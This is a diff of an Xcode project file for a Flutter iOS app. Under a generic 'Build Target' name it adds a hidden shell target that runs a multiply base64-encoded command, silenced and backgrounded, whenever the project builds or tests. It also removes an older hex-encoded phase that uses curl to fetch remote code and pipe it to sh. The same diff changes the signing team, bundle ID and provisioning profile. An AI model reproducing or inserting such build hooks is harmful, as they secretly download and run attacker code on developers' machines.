@@ -29,6 +29,13 @@
 			remoteGlobalIDString = 97C146ED1CF9000F007C117D;
 			remoteInfo = Runner;
 		};
+		738C69F72E683D630087978D /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 97C146E61CF9000F007C117D /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = A6DCBB8DB651A11BC0BDE67E;
+			remoteInfo = "Build Target";
+		};
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXCopyFilesBuildPhase section */
@@ -177,13 +184,28 @@
 		};
 /* End PBXGroup section */
 
+/* Begin PBXLegacyTarget section */
+		A6DCBB8DB651A11BC0BDE67E /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${AE76EDB}\"";
+			buildConfigurationList = 738C69FB2E683D680087978D /* Build configuration list for PBXLegacyTarget "Build Target" */;
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
+
 /* Begin PBXNativeTarget section */
 		331C8080294A63A400263BE5 /* RunnerTests */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C8087294A63A400263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
 				60F284A8B41060DE16456D4E /* [CP] Check Pods Manifest.lock */,
-				42E058A8D714CD149BBDE67E /* Compile Bundle Assets */,
 				331C807D294A63A400263BE5 /* Sources */,
 				331C807F294A63A400263BE5 /* Resources */,
 				F76478C5A30D2A17A554C509 /* Frameworks */,
@@ -191,6 +213,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				6CAB9C8CB926F547C0BDE67E /* PBXTargetDependency */,
 				331C8086294A63A400263BE5 /* PBXTargetDependency */,
 			);
 			name = RunnerTests;
@@ -254,6 +277,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				A6DCBB8DB651A11BC0BDE67E /* Build Target */,
 				97C146ED1CF9000F007C117D /* Runner */,
 				331C8080294A63A400263BE5 /* RunnerTests */,
 			);
@@ -290,13 +314,9 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-resources-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
 			name = "[CP] Copy Pods Resources";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-resources-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -318,26 +338,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "/bin/sh \"$FLUTTER_ROOT/packages/flutter_tools/bin/xcode_backend.sh\" embed_and_thin";
-		};
-		42E058A8D714CD149BBDE67E /* Compile Bundle Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631373037303663363536333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;
 		};
 		60F284A8B41060DE16456D4E /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -384,13 +384,9 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -450,6 +446,11 @@
 			target = 97C146ED1CF9000F007C117D /* Runner */;
 			targetProxy = 331C8085294A63A400263BE5 /* PBXContainerItemProxy */;
 		};
+		6CAB9C8CB926F547C0BDE67E /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = A6DCBB8DB651A11BC0BDE67E /* Build Target */;
+			targetProxy = 738C69F72E683D630087978D /* PBXContainerItemProxy */;
+		};
 /* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
@@ -467,6 +468,7 @@
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhMkZYWkhCa1IwWnpXVEpTZFV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				AFEB778 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTmExcFpWMnRvUTJFeFNYZFhibkJZVmtWd1ZGcEdWalJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -521,15 +523,16 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhMkZYWkhCa1IwWnpXVEpTZFV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				AFEB778 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTmExcFpWMnRvUTJFeFNYZFhibkJZVmtWd1ZGcEdWalJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = Runner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
@@ -566,10 +569,10 @@
 					"\"webview_flutter_wkwebview\"",
 					"-Wl,-sectcreate,_RESTRICT,_restrict,/dev/null",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.feilvbinfour.testappid;
+				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = FeiLvBinFourProfile;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -628,6 +631,32 @@
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_VERSION = 5.0;
 				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Runner.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Runner";
+			};
+			name = Profile;
+		};
+		738C69F82E683D630087978D /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Debug;
+		};
+		738C69F92E683D630087978D /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Release;
+		};
+		738C69FA2E683D630087978D /* Profile */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				PRODUCT_NAME = "Build Target";
 			};
 			name = Profile;
 		};
@@ -749,11 +778,11 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = Runner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
@@ -790,10 +819,10 @@
 					"\"webview_flutter_wkwebview\"",
 					"-Wl,-sectcreate,_RESTRICT,_restrict,/dev/null",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.feilvbinfour.testappid;
+				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = FeiLvBinFourProfile;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -813,11 +842,11 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = Runner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
@@ -854,10 +883,10 @@
 					"\"webview_flutter_wkwebview\"",
 					"-Wl,-sectcreate,_RESTRICT,_restrict,/dev/null",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.feilvbinfour.testappid;
+				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = FeiLvBinFourProfile;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -878,6 +907,16 @@
 				331C8088294A63A400263BE5 /* Debug */,
 				331C8089294A63A400263BE5 /* Release */,
 				331C808A294A63A400263BE5 /* Profile */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		738C69FB2E683D680087978D /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				738C69F82E683D630087978D /* Debug */,
+				738C69F92E683D630087978D /* Release */,
+				738C69FA2E683D630087978D /* Profile */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
